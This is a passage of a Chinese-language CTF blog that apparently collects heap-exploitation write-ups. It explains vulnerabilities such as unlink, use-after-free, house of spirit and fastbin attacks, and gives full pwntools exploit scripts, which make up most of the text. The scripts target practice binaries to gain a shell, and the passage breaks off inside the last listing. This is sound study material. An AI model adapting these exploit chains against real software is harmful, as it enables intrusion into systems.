class="comment"># place fake chunk at destructor&#x27;s pointer</span></span><br><span class="line">    fakechunk_addr = <span class="number">0x6030E8</span></span><br><span class="line">    fakechunk = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(fakechunk_addr - <span class="number">0x18</span>) + p64(</span><br><span class="line">        fakechunk_addr - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">    fakechunk = fakechunk.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    fakechunk += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">    change(<span class="number">6</span>, fakechunk)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger unlink</span></span><br><span class="line">    remove(<span class="number">3</span>) <span class="comment">#unlink 6</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make 0x6030F8 point to 0x6030E8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="number">0x18</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0x6030E8</span>)</span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make exit just as return</span></span><br><span class="line">    write(robots.got[<span class="string">&#x27;exit&#x27;</span>], <span class="number">0x401954</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set wheel cnt =3, 0x603130 in order to start robot</span></span><br><span class="line">    write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set destructor point to puts@got</span></span><br><span class="line">    change(<span class="number">1</span>, p64(robots.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    start_robot()</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;New hands great!! Thx &#x27;</span>)</span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">b&#x27;!\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make free-&gt;system</span></span><br><span class="line">    write(robots.got[<span class="string">&#x27;free&#x27;</span>], system_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make destructor point to /bin/sh addr</span></span><br><span class="line">    write(<span class="number">0x6030E8</span>, binsh_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get shell</span></span><br><span class="line">    remove(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h2 id="2014ZCTF-note3"><a href="#2014ZCTF-note3" class="headerlink" title="2014ZCTF note3"></a>2014ZCTF note3</h2><p><strong>难度:★★</strong></p><p>难度和前几题差不多,<strong>但有一个大坑!!</strong></p><p><strong>利用点1:</strong>如果size输入0,会存在一个无符号整型与有符号整型的比较,造成整数溢出,几乎可以无限输入</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./note3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:(less than 1024)\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; content:\n&#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;id of the note:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;Delete success\n&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;the note:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;new content:\n&#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;Edit success\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./note3&#x27;</span>)</span><br><span class="line">chunk0_ptr_addr=<span class="number">0x6020C8</span></span><br><span class="line">newnote(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">newnote(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">newnote(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0x20</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)+p64(chunk0_ptr_addr-<span class="number">0x10</span>)+p64(chunk0_ptr_addr-<span class="number">0x8</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">change(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(sys_addr)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>说一下刚才提到的坑</strong>,就是程序自定义的输入函数,会将输入的最后一个字符的后一字节置为0或者遇到换行符将换行符置为0,这里是第二种情况</p><p>因此在写一个got表时,就会把这个got附近的got表给修改掉,从而使程序异常退出,被一脸懵逼地卡了好久</p><p>解决办法就是p64(elf.plt[‘puts’])[:-1]这样,只发送8个字节,且第八个字节被置为0,不影响本来的数据(高地址本来就是0),如果不这样的话相邻的got表的最低字节就会变成0</p><p><strong>说到底还是怪自己没注意sendline.</strong></p><p>另外还学到了伪造unlink后项chunk的方法,即通过后项的后项的size判断后项是否被使用,并以此绕过</p><h2 id="HITCON-training-lab-10-hacknote"><a href="#HITCON-training-lab-10-hacknote" class="headerlink" title="HITCON-training lab 10 hacknote"></a>HITCON-training lab 10 hacknote</h2><p><strong>难度:★</strong></p><p>防护nx和canary</p><p>利用点是UAF,delete函数只是free没有置0,意味着其他函数照样可以继续使用该chunk,但是其又可以被分配给新的note,这样我们就具有了修改一个可以被使用的note的头的能力</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntilb(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">b&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">b&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><p><strong>难度:★★</strong></p><p>防护照旧</p><p>很容易发现添加操作时的读取溢出,且申请的chunk的最后四字节存放上一个chuk的指针</p><p>即用单链表存储申请的chunk</p><p>加上溢出可以控制这个指针</p><p>写的功能除了add就只剩下leave_messa了</p><p>且free时就是按照单链表来取出chunk逐个free</p><p>故利用点是house of spirit,方向是在message指向处伪造chunk,刚好程序存在一个记录chunk数的内存域,可以被视为size,只要chunk数量刚好对齐</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,des</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil(b&#x27;Rifle name: &#x27;)</span></span><br><span class="line">    p.sendline(name)</span><br><span class="line">    <span class="comment">#p.recvuntil(b&#x27;Rifle description: &#x27;)</span></span><br><span class="line">    p.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil(b&quot;Enter any notice you&#x27;d like to submit with your order: &quot;)</span></span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">name=<span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">add(name,<span class="string">b&#x27;\n&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">puts_addr=p.recv(<span class="number">4</span>)</span><br><span class="line">puts_addr=u32(puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base_addr=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system=base_addr+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (count &lt; <span class="number">0x3f</span>):</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(<span class="number">0x804a2a8</span>)</span><br><span class="line">add(payload,<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0x40</span>)+p32(<span class="number">0x100</span>)</span><br><span class="line">message(payload)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">order()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;Okay order submitted!\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = p32(elf.got[<span class="string">&#x27;strlen&#x27;</span>])</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>, payload)</span><br><span class="line"></span><br><span class="line">message(p32(system) + <span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)<span class="comment">#;执行多个命令,写完后立马执行</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>再次记一下,puts函数遇到空字符结束,且必然会在结尾添加一个’\n’,无论结尾本身是否有换行</strong></p><h2 id="2015-9447-CTF-Search-Engine"><a href="#2015-9447-CTF-Search-Engine" class="headerlink" title="2015 9447 CTF : Search Engine"></a>2015 9447 CTF : Search Engine</h2><p><strong>难度:★★★</strong></p><p>这题的难度有一部分在于程序本身较为复杂,静态分析需要不少功夫</p><h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><p><strong>难度:★★★</strong></p><p>这题开启了pie和以上几题不同</p><p>这题关键的漏洞在于填充申请的chunk时,大小是我们自己任意指定的,而不是申请时的大小,意味着几乎无限制溢出</p><p>攻击中用到fastbin attack与unsortedbin attack</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_arena_offset=libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx3 for overflow idx4</span></span><br><span class="line">alloc(<span class="number">0x80</span>)  <span class="comment">#idx4</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)  <span class="comment">#头插法 layout fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p8(<span class="number">0x80</span>)<span class="comment">#fixed size</span></span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#get idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#get idx4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x80</span>)<span class="comment">#idx5 avoid consolidate to top</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: \n&#x27;</span>)</span><br><span class="line">unsortedbin_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(unsortedbin_addr))</span><br><span class="line">main_arena=unsortedbin_addr-<span class="number">88</span></span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>,fake_chunk)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">one_gadget_addr = libc_base + <span class="number">0x4527a</span></span><br><span class="line">payload = <span class="number">0x13</span> * <span class="string">b&#x27;a&#x27;</span> + p64(one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>一个很关键的点在要从idx4中切割出第一个0x70大小的chunk,这样再把这个chunk释放掉才能直接控制fd,当然另外申请0x70大小的也是可行的,要多麻烦几步就是了</p><p><strong>小记0x7-0xa</strong></p><h2 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h2><p><strong>难度:★</strong></p><p>功能可以说是非常常规了,保护照旧nx和canary</p><p>漏洞点是edit时大小是由自己定的,无限制溢出</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 